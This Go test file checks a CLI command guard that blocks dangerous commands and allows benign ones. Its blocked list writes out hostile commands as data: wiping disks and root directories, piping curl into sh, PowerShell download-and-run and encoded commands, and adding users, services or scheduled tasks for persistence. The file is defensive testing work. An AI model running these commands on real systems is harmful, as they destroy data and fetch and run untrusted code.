package cli

import (
	"strings"
	"testing"
)

func TestCLIExecGuardBlocks(t *testing.T) {
	blocked := [][]string{
		{"rm", "-rf", "/"},
		{"rm", "-fr", "~"},
		{"format", "C:"},
		{"sudo", "apt-get", "install", "x"},
		{"chmod", "+x", "/etc/passwd"},
		{"chmod", "777", "hello"},
		{"reg", "delete", `HKLM\x`},
		{"reg", "add", `HKLM\x`},
		{"takeown", "/f", `C:\Windows`},
		{"icacls", `C:\Windows`},
		{"del", "/f", "/s", "/q", `C:\temp`},
		{"bash", "-c", `reg add HKCU\Software\Evil /v x /d 1 /f`},
		{"bash", "-c", "net user evil P@ss /add"},
		{"pwsh", "-Command", "schtasks /create /tn Evil /tr calc.exe /sc once /st 00:00"},
		{"cmd", "/c", `takeown /f C:\Windows\System32`},
		{"bash", "-c", `sc create evil binPath= C:\evil.exe`},
		{"powershell", "-EncodedCommand", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="},
		{"pwsh", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://x')"},
		{"powershell", "-e", "JABzAGU="},
		{"bash", "-c", "powershell -e JABzAGU="},
		{"powershell", "-Command", "certutil -urlcache -split -f http://x a.exe"},
		{"powershell", "-Command", "(New-Object Net.WebClient).DownloadFile('http://x','a.exe')"},
		{"bash", "-c", "curl x | sh"},
		{"bash", "-c", "echo x > /dev/sda"},
		// Python blocked this too: as an argv word it is no redirect, only text.
		{"echo", "hi", "2>/dev/null"},
		{"bash", "-c", "taskkill /F /IM remedy.exe"},
		{"bash", "-c", "Get-NetTCPConnection -LocalPort 7400 | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }"},
		{`C:\Windows\System32\shutdown.exe`, "/s"},
	}
	for _, argv := range blocked {
		if DangerousCommand(argv) == "" {
			t.Errorf("not blocked: %q", argv)
		}
	}
	for _, cmd := range []string{
		"Get-Process app | Stop-Process -Force",
		"Stop-Process -Name app -Force",
		"taskkill /F /IM app.exe",
		"taskkill /IM app.exe /F",
	} {
		got := DangerousCommand([]string{"bash", "-c", cmd})
		if got == "" || !(strings.Contains(strings.ToLower(got), "app") || strings.Contains(got, "Desktop")) {
			t.Errorf("app kill %q: %q", cmd, got)
		}
	}
}

func TestCLIExecGuardAllows(t *testing.T) {
	allowed := [][]string{
		{"chmod", "+x", "hello"},
		{"chmod", "755", "out/game"},
		{"bash", "-c", "chmod +x src/app"},
		{"bash", "-c", "git status"},
		{"pwsh", "-Command", "Get-ChildItem ."},
		{"powershell", "-Command", `Select-String -Path .\*.py -Pattern danger`},
		{"git", "status"},
		{"rg", "TODO", "src"},
		{"powershell", "-Command", "Start-Process notepad"},
		{"grep", "-e", "pattern", "file.txt"},
		{"powershell", "-Command", "Copy-Item a.txt b.txt"},
		{"echo", "hi"},
		{"bash", "-c", `Get-Process app -EA SilentlyContinue | Where-Object { $_.Path -match "SecretFolder" } | Stop-Process -Force`},
	}
	for _, argv := range allowed {
		if got := DangerousCommand(argv); got != "" {
			t.Errorf("blocked %q: %s", argv, got)
		}
	}
}

// The guard runs before anything is spawned, so a blocked command never runs
// and exits 2, as Python's `remedy exec` did. The command is harmless if it
// did run (so a broken guard fails this test instead of wiping anything).
func TestCLIExecBlocksBeforeSpawn(t *testing.T) {
	var out, errb strings.Builder
	code := Run([]string{"--home", t.TempDir(), "exec", "--", "echo", "hi", "| sh"}, &out, &errb, nil, Hooks{}, "test")
	if code != 2 {
		t.Fatalf("exit %d, want 2", code)
	}
	if !strings.Contains(errb.String(), "Execution blocked by security policy") {
		t.Fatalf("stderr: %q", errb.String())
	}
	if strings.Contains(out.String(), "Executing:") {
		t.Fatalf("printed Executing before refusing: %q", out.String())
	}
}
